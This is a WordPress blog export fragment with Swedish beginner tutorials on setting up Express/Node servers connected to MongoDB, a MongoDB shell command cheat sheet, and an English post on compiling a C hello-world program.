		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=555</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Starta express-servern</strong>
1. Skapa en mapp med app-namnet.

2. I mappen skriv <strong>npm init</strong>, eller något sådant för att automatiskt generera en package-file.

3. Skapa en server.js-fil, eller app.js.
 - Importera de moduler som du behöver: http, express, path, fs.
 - routra de filer du vill servera.
 - importera databasen

4. Öppna upp mongod, och dess shell mongo. 
Skapa en databas med kommandot:
<strong>use namnPåDatabas</strong>
lägg till innehåll med kommandot:
<strong>db.usercollection.insert({"username" : "pelle88", "name" : "pelle"})</strong>
läs i databasen genom kommandot.
<strong> db.usercollection.find().pretty();</strong>

5. Skapa index.jade
- Lägg till text.
- För att koppla filen till databasen behöver man typ något slags each-statement eller något liknande.

6. Starta servern å beskåda verket.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1672</wp:post_id>
		<wp:post_date>2015-11-06 20:59:49</wp:post_date>
		<wp:post_date_gmt>2015-11-06 20:59:49</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>how-to-mean-app</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[16607466502]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[555]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[555]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Express/node</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/11/16/expressnode/</link>
		<pubDate>Mon, 16 Nov 2015 14:37:08 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=569</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Hur man skapar en basic express-server och serverar en index-fil.</h1>
1. Skapa en mapp.
2. I terminalen i mappen skriva:
npm init
Detta kommando skapar en package.json fil. Detta fil innehåller metainformationen om din app. Den är nödvändig för att allt ska fungera.
3. Ladda ner express genom kommandot:
npm install express --save
Med tillägget --save så sparas modulen automatiskt i package-json-filen, så slipper du uppdatera den för hand.
4.Skapa en fil som heter app.js (den kan heta server.js, eller någonting annat. men praxis med express är att kalla den för app.js).
5. I filen skriv in följande kod:
[code lang="js"]
var express = require(&amp;amp;amp;amp;quot;express&amp;amp;amp;amp;quot;); //Här importerar vi modulen express.
var path = require(&amp;amp;amp;amp;quot;path&amp;amp;amp;amp;quot;); //Här importerar vi modulen path. Denna hjälper oss att enkelt hitta i vårt filsystem på datorn.

var app = express();

app.get(&amp;amp;amp;amp;quot;/&amp;amp;amp;amp;quot;, function(req, res){
res.sendFile(path.join(__dirname + &amp;amp;amp;amp;quot;/index.html&amp;amp;amp;amp;quot;));
});

app.listen(3000); //Säger åt servern att börja lyssna på port 3000 efter requests.
[/code]

app.get - Här skickar vi en get-request, om någon söker efter sidan localhost:3000. Det är alltså själva index-sidan. Så om nån går in på index-sidan (alltså localhost:3000) så skickar browserna en request till servern. Servern besvarar då requesten med ett response (res). Responsen är att skicka en fil: res.sendFile. path.join(__dirname + "/index.html")); - path.join(__dirname tar fram hela adressen fram till index-filen. Så istället för att behöva skriva /Users/userName/node-app/serve-static-file. Så detta skulle alltså gå att skriva:
res.sendFile(/Users/minDator/kod/serve-static-file/index.html"));

6.Skapa index.html
Nu behöver vi bara skapa en index.html-fil för att skicka när servern har tagit emot en request. Så skapa en index.html-fil i samma mapp som app.js, med vanligt html-innehåll.

All kod finns att hämta <a href="https://github.com/xapax/serve-static-file">här</a>.
<h1>Hur man skapar en basic express-server och serverar en dynamisk jade-fil</h1>
Skillnaden mellan detta exempel och exemplet ovan är väldigt liten. Den enda direkta skillnaden är att jade-filer ovandlas i servern till html. Så själva filen index.jade skickas inte, hur den omvandlas till index.html och skickas därefter.

1. Skapade package.json
npm init

2. ladda ner expess-modulen
npm install express --save

3. ladda ner jade-modulen
npm install jade --save

4. skapa en app.js-fil.
[code lang="js"]
var express = require(&amp;amp;amp;amp;quot;express&amp;amp;amp;amp;quot;); //Här importerar vi modulen express.
var path = require(&amp;amp;amp;amp;quot;path&amp;amp;amp;amp;quot;); //Här importerar vi modulen path. Denna hjälper oss att enkelt hitta i vårt filsystem på datorn.
var jade = require(&amp;amp;amp;amp;quot;jade&amp;amp;amp;amp;quot;); //Här importerar vi modulen jade

var app = express();

app.get(&amp;amp;amp;amp;quot;/&amp;amp;amp;amp;quot;, function(req, res){
res.render(&amp;amp;amp;amp;quot;index&amp;amp;amp;amp;quot;, {title : &amp;amp;amp;amp;quot;Testing jade&amp;amp;amp;amp;quot;}));
});

app.listen(3000); //Säger åt servern att börja lyssna på port 3000 efter requests.
[/code]

Det enda som egentligen skiljer sig här, jämfört med tidigre tutorial är att vi importerar modulen jade, genom require("jade");.
Sedan renderar vi filen istället för att skicka den. Eftersom vi inte vill skicka index.jade så måste vi göra om den till index.html, detta gör vi genom
res.render("index")
Sedan lägger vi till lite dynamiskt innehåll för att det är kul.

5. Skapa mappen views och skapa däri filen index.jade.
[code lang="jade"]
doctype html
html
  head
    title= title
  body
    h1 This is part of the tutortial to render and serve a jade-file
[/code]
Det enda som egentligen är konstigt här är title= title. Det är här vi infogar den dynamiska datan som vi lade till i app-js-filen.
res.render har som default-väg mappen views. Så om du lägger index.jade i root-mappen så kommer du få upp ett felmeddelande. Därför måste du skapa mappen views och lägga filen där i.

<h1>Hur man skapar en basic express-app som är kopplad till en databas.</h1>

<strong>Installera alla moduler</strong>
1. npm init
2. npm install monk --save
npm install mongodb --save
npm install express --save
Monk är modulen som hjälper oss att hantera vår databas.
Mongodb är vår databas
Express är såklart modulen som hjälper oss med routering och http å sånt.

<strong>Konfigurera databasen</strong>
3. skapa mappen data
4. öppna terminalen och öppna mongodb genom kommandot
mongod --dbpath /Users/Dator/kod/node/database-app/data/
Eller till den korrekta adressen. När du skriver in det här kommandot som sparas databasen i mappen data.
5. Gå till mappen data och starta mongo-konsollen med kommandot
mongo
6. Skapa en databas med kommandot:
use db-app
Skapa sedan en collection och infoga något med kommandot:
db.info.insert({"namn" : "Lars"});
info är vad jag väljer att kalla min collection.

</strong>Skapa innehåll</strong>
7. Skapa filen app.js
[code lang="js"]
//Importera nödvändiga moduler
var express = require(&amp;amp;amp;amp;quot;express&amp;amp;amp;amp;quot;);
var path = require(&amp;amp;amp;amp;quot;path&amp;amp;amp;amp;quot;);
var jade = require(&amp;amp;amp;amp;quot;jade&amp;amp;amp;amp;quot;);
var monk = require(&amp;amp;amp;amp;quot;monk&amp;amp;amp;amp;quot;);
var mongodb = require(&amp;amp;amp;amp;quot;mongodb&amp;amp;amp;amp;quot;);

//Spara databas i variabeln db. db-app är namnet på databasen jag skapade tidigare.
var db = monk(&amp;amp;amp;amp;quot;localhost:27017/db-app&amp;amp;amp;amp;quot;)

// Skapar en express-app
var app = express();

//Routrar till min stylesheetmapp och js-mapp.
app.use(express.static(__dirname + '/stylesheet'));
app.use(express.static(__dirname + '/js'));

//Routrar index.html till index-sidan.
app.get(&amp;amp;amp;amp;quot;/&amp;amp;amp;amp;quot;, function(req, res){
	res.sendFile(path.join(__dirname + &amp;amp;amp;amp;quot;/index.html&amp;amp;amp;amp;quot;));
});

//Detta gör vår databas tillgänglig för vår router.
app.use(function(req, res, next){
  req.db = db;
  next();
})

//Här sätter vi upp &amp;amp;amp;amp;quot;sidan&amp;amp;amp;amp;quot; db-app. Det är alltså sidan localhost:3000/db-app. Så om nån skickar en request till den sidan, så svarar vår server med att skicka vår databas.
app.get(&amp;amp;amp;amp;quot;/db-app&amp;amp;amp;amp;quot;, function(req, res){
	var db = req.db;
	var collection = db.get(&amp;amp;amp;amp;quot;info&amp;amp;amp;amp;quot;);
	collection.find({},{},function(e, docs){
		res.json(docs);
	});
});

app.listen(3000);
[/code]

8. Skapa index.html, style.css och script.js.
index.html skapas i rootmappen.
[code lang="html"]
&amp;amp;amp;amp;lt;!DOCTYPE html&amp;amp;amp;amp;gt;
&amp;amp;amp;amp;lt;html lang=&amp;amp;amp;amp;quot;en&amp;amp;amp;amp;quot;&amp;amp;amp;amp;gt;
&amp;amp;amp;amp;lt;head&amp;amp;amp;amp;gt;
	&amp;amp;amp;amp;lt;meta charset=&amp;amp;amp;amp;quot;UTF-8&amp;amp;amp;amp;quot;&amp;amp;amp;amp;gt;
	&amp;amp;amp;amp;lt;title&amp;amp;amp;amp;gt;Database test&amp;amp;amp;amp;lt;/title&amp;amp;amp;amp;gt;
	&amp;amp;amp;amp;lt;link rel=&amp;amp;amp;amp;quot;stylesheet&amp;amp;amp;amp;quot; href=&amp;amp;amp;amp;quot;/style.css&amp;amp;amp;amp;quot;&amp;amp;amp;amp;gt;
	&amp;amp;amp;amp;lt;script src=&amp;amp;amp;amp;quot;https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js&amp;amp;amp;amp;quot;&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;
	&amp;amp;amp;amp;lt;script src=&amp;amp;amp;amp;quot;/script.js&amp;amp;amp;amp;quot;&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;
&amp;amp;amp;amp;lt;/head&amp;amp;amp;amp;gt;
&amp;amp;amp;amp;lt;body&amp;amp;amp;amp;gt;
	&amp;amp;amp;amp;lt;h1&amp;amp;amp;amp;gt;Testing to connect to database&amp;amp;amp;amp;lt;/h1&amp;amp;amp;amp;gt;
&amp;amp;amp;amp;lt;/body&amp;amp;amp;amp;gt;
&amp;amp;amp;amp;lt;/html&amp;amp;amp;amp;gt;
[/code]
Ja, här är det inga konstigheter. Vi importerar bara jQuery och vår css och vårt javascript-fil.

9. Gör ett ajax-get-call i script.js
Öppna script.js.
[code lang="js"]
$(document).ready(function(){
getData();
});
function getData(){
	$.getJSON(&amp;amp;amp;amp;quot;/db-app&amp;amp;amp;amp;quot;, function(data){
		console.log(data);
	});
};
[/code]
Det här är inga konstigheter. Här skapar vi en funktion som heter getData och som körs automatiskt när sidan öppnas. I funktionen gör vi ett getJSON-call till sidan "/db-app". När vi tar emot datan så printar vi bara ut den i konsollen.

Sådär. Det var allt. Svårare än så är det inte. Det krävs alltså i princip bara 4 filer. package.json, app.js, index.html, och script.js för att skapa en server som är kopplad till en databas.

Koden finns att hämta här</a>

<h1>Hur skapar man en express-server som kan göra get och post-requests till en MongoDB-databas</h1>

1. npm init
2. Installera moduler
npm install express --save
npm install mongodb --save
npm install body-parser --save
npm install monk --save

ett enklare sätt att skriva detta är:
npm install express mongodb body-parser monk --save
3. Skapa en databas

Skapa mappen data
mongod --dbpath /path/till/data/mappen
Gå till mappen kör kommandot:
mongo
sedan:
use namnpådatabas
skapa en collection och sätt in data där
db.namnpåcollection.insert({"namn" : "Pelle", "age" : 34});
Kontrollera att datan finns i databasen:
db.namnpåcollection.find().pretty();

Datanbasen är färdig.

4. Skapa filen app.js
Här är filens innehåll. Det mesta bör vara bekant vid det här laget.

[code lang="js"]
//Importera moduler.
var express = require(&amp;amp;amp;quot;express&amp;amp;amp;quot;);
var path = require(&amp;amp;amp;quot;path&amp;amp;amp;quot;);
var bodyParser = require(&amp;amp;amp;quot;body-parser&amp;amp;amp;quot;);
var monk = require(&amp;amp;amp;quot;monk&amp;amp;amp;quot;);
var mongodb = require(&amp;amp;amp;quot;mongodb&amp;amp;amp;quot;);

//Koppla upp oss mot databasen
var db = monk(&amp;amp;amp;quot;localhost:27017/namnpådatabas&amp;amp;amp;quot;);

//Initierar expressappen.
var app = express();

//Detta är för att kunna serva våra statiska filer i css och js-mapparna.
app.use(express.static(&amp;amp;amp;quot;css&amp;amp;amp;quot;));
app.use(express.static(&amp;amp;amp;quot;js&amp;amp;amp;quot;));

//Här servar vi index.html-filen. Inga konstigheter.
app.get(&amp;amp;amp;quot;/&amp;amp;amp;quot;, function(req, res){
	res.sendFile(path.join(__dirname + &amp;amp;amp;quot;/index.html&amp;amp;amp;quot;));
})

//Här skickar vi databasens innehåll till sidan /databas. Denna sida plockas upp av ett ajax-call i filen script.js som vi kommer skapa senare. collection.find tar här en callbackfunktion, å docs i callbackfunktionen hänvisar till det som finns i databasen. Sedan skickar vi det som finns i databasen som response. Därav res.json(docs).
app.get(&amp;amp;amp;quot;/databas&amp;amp;amp;quot;, function(req, res){
	var collection = db.get(&amp;amp;amp;quot;datacollection&amp;amp;amp;quot;);
	collection.find({}, {}, function(e, docs){
		res.json(docs);
	})
})

//Detta är vad som kallas för middle-ware. Detta behövs för att servern ska kunna ta emot information från requesten som kommer härafter. Utan bodyParser så kan man inte få tag i datan.
app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(bodyParser.json());

//Nu kommer vi vill routern som hanterar post. Här ser vi alltså att om det postas någonting till sidan /adduser så ska servern ta informationen req[&amp;amp;amp;quot;body&amp;amp;amp;quot;] å spara den i variabeln namn. Sedan insertar vi datan i databasen. Det är viktigt här att sedan skicka ett svar till klienten. Svaret res.send(&amp;amp;amp;quot;done&amp;amp;amp;quot;); annars så får man ett fel. Det är även fundamentalt att skicka någon information. Om ingen data skickas så får man också ett fel 500 Internal Server error.
app.post(&amp;amp;amp;quot;/adduser&amp;amp;amp;quot;, function(req, res){
    var name = req[&amp;amp;amp;quot;body&amp;amp;amp;quot;];
    var collection = db.get(&amp;amp;amp;quot;datacollection&amp;amp;amp;quot;);
	collection.insert(name, function (err, doc) {
  if (err) throw err;
  console.log(doc);
  res.send(&amp;amp;amp;quot;done&amp;amp;amp;quot;);
	});
})

//Här säger vi åt servern att sätta igång å lyssna.
app.listen(3000);
[/code]

5. Skapa index.html
Aja, inga konstigheter här. Vi importerar jQuery. Sedan skapar vi ett enkelt formulär get vardera input ett eget id. Och sedan får knappen ett eget id.
[code lang="html"]
&amp;amp;amp;lt;!DOCTYPE html&amp;amp;amp;gt;
&amp;amp;amp;lt;html lang=&amp;amp;amp;quot;en&amp;amp;amp;quot;&amp;amp;amp;gt;
&amp;amp;amp;lt;head&amp;amp;amp;gt;
	&amp;amp;amp;lt;meta charset=&amp;amp;amp;quot;UTF-8&amp;amp;amp;quot;&amp;amp;amp;gt;
	&amp;amp;amp;lt;title&amp;amp;amp;gt;MongoDB-app&amp;amp;amp;lt;/title&amp;amp;amp;gt;
	&amp;amp;amp;lt;script src=&amp;amp;amp;quot;https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js&amp;amp;amp;quot;&amp;amp;amp;gt;&amp;amp;amp;lt;/script&amp;amp;amp;gt;
	&amp;amp;amp;lt;script src=&amp;amp;amp;quot;/script.js&amp;amp;amp;quot;&amp;amp;amp;gt;&amp;amp;amp;lt;/script&amp;amp;amp;gt;
	&amp;amp;amp;lt;link rel=&amp;amp;amp;quot;stylesheet&amp;amp;amp;quot; href=&amp;amp;amp;quot;/style.css&amp;amp;amp;quot;&amp;amp;amp;gt;

&amp;amp;amp;lt;/head&amp;amp;amp;gt;
&amp;amp;amp;lt;body&amp;amp;amp;gt;
	&amp;amp;amp;lt;h1&amp;amp;amp;gt;Post your name and age to the database&amp;amp;amp;lt;/h1&amp;amp;amp;gt;

	&amp;amp;amp;lt;form&amp;amp;amp;gt;
		&amp;amp;amp;lt;input id=&amp;amp;amp;quot;name&amp;amp;amp;quot; type=&amp;amp;amp;quot;text&amp;amp;amp;quot; placeholder=&amp;amp;amp;quot;name&amp;amp;amp;quot;&amp;amp;amp;gt;
		&amp;amp;amp;lt;input id=&amp;amp;amp;quot;age&amp;amp;amp;quot; type=&amp;amp;amp;quot;text&amp;amp;amp;quot; placeholder=&amp;amp;amp;quot;age&amp;amp;amp;quot;&amp;amp;amp;gt;
		&amp;amp;amp;lt;button id=&amp;amp;amp;quot;btnAddUser&amp;amp;amp;quot;&amp;amp;amp;gt;Submit&amp;amp;amp;lt;/button&amp;amp;amp;gt;
	&amp;amp;amp;lt;/form&amp;amp;amp;gt;	
&amp;amp;amp;lt;/body&amp;amp;amp;gt;
&amp;amp;amp;lt;/html&amp;amp;amp;gt;
[/code]

6. Skapa filen script.js
Inga konstigheter här heller direkt. 



Adduser
[code lang="js"]
$(document).ready(function(){
	
//Först i vårt getJSON så tar vi emot data från sidan /databas, sedan loggar vi datan och printar sedan ut den på sidan.
$.getJSON(&amp;amp;amp;quot;/databas&amp;amp;amp;quot;, function(data){
	console.log(data);
	for (key in data){
		$(&amp;amp;amp;quot;body&amp;amp;amp;quot;).append(data[key].namn + &amp;amp;amp;quot;&amp;amp;amp;lt;br&amp;amp;amp;gt;&amp;amp;amp;quot;);	
	}
	
	})
//Sen har vi en knapp som kallar funktionen addUser när man klickar på den.
	$('#btnAddUser').on('click', addUser);
});

//Nu kommer vi nog till det viktigaste. Här har vi en variabel som fylls med värdena från vårt formulär. Sen har vi vårt ajax-call. Som skickar till url: /adduser. typen är POST. datan som den skickar är variabeln som vi deklarerar precis innan. Å typen är JSON.
function addUser(){
	var newUser = {
	    'namn': $('#name').val(),
	    'age': $('#age').val(),
	}
	console.log(newUser);
	$.ajax({
		  url: '/adduser',
	    type: 'POST',
	    data: newUser,
	    dataType: 'JSON'
	});
	 }
[/code]

7. Sådär. Det var allt. Nu är det bara att köra igång databasen och köra igång node med kommandot node app.js. Sen gå till localhost:/3000 Där kan du sen posta data till databasen.

<h2>Hur man skapar en express-server och kopplar upp den med mongodb med hjälp av mongoose</h2>
1. npm install mongodb express mongoose --save
2. Skapa app.js
3. Starta mongod och mongo.
[code lang="js"]
var express = require(&quot;express&quot;);
var mongodb = require(&quot;mongodb&quot;);
var mongoose = require(&quot;mongoose&quot;);
var path = require(&quot;path&quot;);

//Starts express.
var app = express();

//Connects to the database. Databas is the name of the database.
//If it does not already exist mongo creates it.
mongoose.connect(&quot;mongodb://localhost/databas&quot;);

//Not sure what this does.
var db = mongoose.connection;

//This produces an error or success message when starting the server.
db.on(&quot;error&quot;, console.error.bind(console, 'connection error:'));
db.once(&quot;open&quot;, function(callback){
	console.log(&quot;database up and running&quot;)
});

//Here we create the database Schema. That is the format for how we are going to enter in data. 
//We also create the name of the collection on the last line.
var FormSchema = new mongoose.Schema({
	name: String,
	created: Date,
}, {collection: &quot;apa&quot;});

//Here we create an instance of the database-schema that we just created.
var MyForm = mongoose.model(&quot;Form&quot;, FormSchema);

//Here we print out the documents found in the database.
MyForm.find(function(err, data){
	console.log(err);
	console.log(data);
})

//Here we are creating new data andsaving it in the database.
var form1 = new MyForm({&quot;name&quot; : &quot;Form 1&quot;});
form1.save();

//För att hitta med dess id gör man såhär:
MyForm.findById(&quot;56537c01e53134e80a1142c4&quot;, function(err, data){
	console.log(data);	
});

[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1673</wp:post_id>
		<wp:post_date>2015-11-16 14:37:08</wp:post_date>
		<wp:post_date_gmt>2015-11-16 14:37:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expressnode</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="javascript"><![CDATA[javascript]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[16907778218]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[569]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[569]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Mongo-db shell kommands</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/11/16/mongo-db-shell-kommands/</link>
		<pubDate>Mon, 16 Nov 2015 17:49:21 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=573</guid>
		<description></description>
		<content:encoded><![CDATA[Fler kommandon finns <a href="https://docs.mongodb.org/manual/reference/mongo-shell/">här</a>.

<strong>Visa alla databaser</strong>
show dbs
eller
show databases

<strong>Visa vilken databas du är i nu</strong>
db

<strong>skapa en databas</strong>
use namn-på-databas

<strong>Infoga info i databas</strong>
Först gå in i databasen genom use namn-på-databas sedan: 
db.namn-på-collection.insert({"namn" : "Lars", "age" : 10});

<strong>Byt till annan databas</strong>
use namn-på-databas

<strong>Via en databas olika collections</strong>
show collections

<strong>Visa de fem senaste kommandona</strong>
show profile

<strong>Visa innehållet i en viss collection.</strong>
Först gå till rätt databas genom use sedan:
db.namn-på-collection.find()
För att göra det lite mer läsvändligt så lägg till pretty:
db.namn-på-collection.find().pretty();

<strong>Ta bort en viss collection</strong>
db.namn-på-collection.drop();

<strong>Visa nuverande databas som jag är i</strong>
db.getName();

<strong>Ta bort en databas helt å hållet</strong>
use namn-på-databas
db.dropDatabase();

<strong>Ta bort en collection</strong>
db.namnpåcollection.remove({});

<strong>Uppdatera dokument</strong>
db.namnpåcollection.update({firstName : "Lars"}, {$set : {"firstName" : "Jerry"}});

<strong>Ta bort alla document i en collection</strong>
db.namnpåcolletion.remove({});]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1674</wp:post_id>
		<wp:post_date>2015-11-16 17:49:21</wp:post_date>
		<wp:post_date_gmt>2015-11-16 17:49:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>mongo-db-shell-kommands</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[16912812754]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[573]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[573]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>About</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/about/</link>
		<pubDate>Wed, 16 Mar 2016 20:11:02 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://stuffidontwanttogoogleagain.wordpress.com/?page_id=1</guid>
		<description></description>
		<content:encoded><![CDATA[This is an example of a page. Unlike posts, which are displayed on your blog’s front page in the order they’re published, pages are better suited for more timeless content that you want to be easily accessible, like your About or Contact information. Click the Edit link to make changes to this page or <a title="Direct link to Add New Page in your Dashboard" href="https://wordpress.com/page/108528383/new/">add another page</a>.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1</wp:post_id>
		<wp:post_date>2016-03-16 20:11:02</wp:post_date>
		<wp:post_date_gmt>2016-03-16 20:11:02</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>about</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:postmeta>
			<wp:meta_key>_wp_page_template</wp:meta_key>
			<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Compile and run a C program</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/03/16/compile-and-run-a-c-program/</link>
		<pubDate>Wed, 16 Mar 2016 22:08:11 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=2</guid>
		<description></description>
		<content:encoded><![CDATA[I have been programming in JavaScript now for a while, and I feel like it would be useful to learn a second language. One that is a bit closer to the machine, to learn a bit more about the computer. So I have settled on C.
 
C was developed in by Dennis Richie between 1969 and 1973, while he was working at AT&amp;T Bell Labs. It was designed to be a general-purpose, high-level language that provide low-level access to memory. C is great because it produces efficient and fast programs. It can handle low-level activities, and do it almost as fast as assembly code. The language was developed closely together with the operating system Unix, and Unix was written in C. And it can be compiled on many different platforms. Linux OS, MySQL and NodeJS are some of the programs written in C. It is also the root of many other languages. Example of languages that have borrow from C are: C++, D, Go, Rust, Java, JavaScript, Limbo, LPC, C#, Objective-C, Perl, PHP, Python, Verilog.

Okay, so C seems like a useful language to learn. Let's get started. 
The first thing we need to know is that in order to run C-code we first need to compile it. That mean we translate the code to an executable file, so that the computer understands it, and is able to run it. This basically mean that we translate the code to machine-code (assembly-code is basically the human-readable representation of machine-code) to be able to talk directly to the CPU. JavaScript is sometimes categorized as a interpreted language, but when used with for example Googles V8 Engine (that powers Node and Chrome) the JS-code is compiled straight to machine-code on the spot. It uses Just-in-time Compilation. The difference between V8 and Rheno (the mozilla JS-compiler) is that V8 does not produce any intermediate code, or bytecode. For more on the V8 click <a href="http://thibaultlaurens.github.io/javascript/2013/04/29/how-the-v8-engine-works/">here</a>. Okay, so that was bit of a detour. Let's get back on track.

Unlike JavaScript that is run in Node we have quite a few different options on which compiler we want to to use to compile our C-code.

I am going to use the [code]make[/code] program in linux. <strong>Make</strong> is a program that uses the <strong>GCC</strong> compiler. Even though the text CC pops up when you compile with make, CC usually points to GCC (Gnu compilation collection).

Anyways, let's get started to write and compile our first program.

hello-world.c
[code lang="c"]
#include &amp;amp;lt;stdio.h&amp;amp;gt;
int main()
{
    printf(&amp;amp;quot;hello, world\n&amp;amp;quot;);
    getchar();
    return 0;
}
[/code]

Okej, so we got the standard "hello world"-program written. Now it is time to compile and run it.
In the dir where you have your hello-world.c-file run the command:
[code]make hello-world[/code]
Notice that we don't include the .c ending.
You will now have an executable know as hello-world, it can be run with the following command:
[code]./hello-world[/code]

Let's look at the code.
First we do an #include. This is basically the same as a require in Node. We import the functions from the stdio.h module/library. stdio stands for Standard Input Output. So yeah, we gain access to the printf- (output), and getchar-function (input). This code is usually called preprocessor command.
The <strong>int main</strong> creates the main function, and we are saying that it will return an integer, hence the int. Every c-program includes a main function. The operating system that runs the program will first look for the main-function, and start there. So all other functions will derive from main.

printf is the standard print-function that prints to the console, and getchar takes input from the user through the console. In the end we return with 0. 0 mean success.

There is not that much new stuff coming from JS. We write the function code inside of curly-brackets, and we end with semi-colon. A major difference between JS and C here is that it is easy to break the C-code, just omit the semi-colon and it will throw an error, and it will not be able to compile, and you will not be able to execute your program.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2</wp:post_id>
		<wp:post_date>2016-03-16 22:08:11</wp:post_date>
